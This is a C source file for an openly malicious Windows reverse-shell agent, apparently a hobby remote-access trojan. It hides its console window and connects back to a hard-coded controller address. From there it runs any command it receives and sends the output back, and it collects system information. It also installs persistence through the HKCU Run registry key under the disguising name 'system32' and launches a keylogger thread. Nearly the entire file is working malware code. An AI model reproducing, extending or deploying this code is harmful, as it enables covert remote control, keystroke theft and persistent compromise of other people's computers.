#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"


#define bzero(p,size) (void) memset((p), 0, (size))

int sock;

// bootrun func
int bootRun()
{
    char err[128] = "Failed\n";
    char suc[128] = "Created persistence key at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock,err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock,err,sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("system32"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err),0);
        return -1;
    }


    // if everything went ok 
    RegCloseKey(NewVal);
    send(sock,suc,sizeof(suc),0);
    return 0;
}


// func to cut stuff like "cd something"
// Usage: str_cut(buffer, start, end)
char *
str_cut(char str[], int slice_from, int slice_to)  
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

char* gsi() {

    char a[254] = ("");

    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);

    OSVERSIONINFO os_info;
    os_info.dwOSVersionInfoSize = sizeof(os_info);
    GetVersionEx(&os_info);

    MEMORYSTATUSEX mem_info;
    mem_info.dwLength = sizeof(mem_info);
    GlobalMemoryStatusEx(&mem_info);

    sprintf(a, "{\"os_name\":\"%s\",\"os_version\":%d.%d,\"cpu_architecture\":%d,\"page_size\":%u,\"processor_count\":%u,\"total_physical_memory\":%llu,\"free_physical_memory\":%llu,\"total_virtual_memory\":%llu,\"free_virtual_memory\":%llu}",
    os_info.szCSDVersion,
    os_info.dwMajorVersion,
    os_info.dwMinorVersion,
    sys_info.wProcessorArchitecture,
    sys_info.dwPageSize,
    sys_info.dwNumberOfProcessors,
    mem_info.ullTotalPhys,
    mem_info.ullAvailPhys,
    mem_info.ullTotalVirtual,
    mem_info.ullAvailVirtual
    );

    send(sock,a,sizeof(a),0);
    return 0;
   
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {
        jump:
        bzero(buffer,1024);
        bzero(container,sizeof(container));
        bzero(total_response,sizeof(total_response));
        recv(sock, buffer, 1024, 0);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if(strncmp("help", buffer, 5) == 0){
            printf("caca");
        }
        else if(strncmp("pwd", buffer, 3) == 0){
            //pwd
        }
        else if(strncmp("ls", buffer, 3) == 0){
            //ls
        }
        else if(strncmp("sys", buffer, 3) == 0){
            gsi();
        }
        else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer,3,100)); // probably no dirnames bigger than 100 chars :)
        }
        else if (strncmp("per", buffer, 3) == 0 ) {
                bootRun();
        }
        else if (strncmp("kl", buffer, 2) == 0 ) {
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            goto jump;
        }
        else {
            FILE *fp;
            fp = _popen(buffer,"r");                    // create FD & looping to xfer more than 1k blocks if it's the case 
            while(fgets(container,1024,fp) != NULL) 
            {
                strcat(total_response,container);
            }
            send(sock, total_response, sizeof(total_response),0);
            fclose(fp);
        }

    }
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int cNmdShow) {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL); 

    ShowWindow(stealth, 0); 


    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.1.47";                                    // node ip addr where the agent will communicate to
    ServPort = 50001;

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) { // check if data struct for winsock 
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);         // ipv4 conn with 3 way handshake

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); 
    ServAddr.sin_port = htons(ServPort);

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10); // TODO: improve this to aviod polling every x seconds 
        goto start;
    }

    // TODO: Put into a sub-command: 
    // MessageBox(NULL, TEXT("This device is pwned"), TEXT("hohoho"), MB_OK | MB_ICONERROR);


    Shell();
}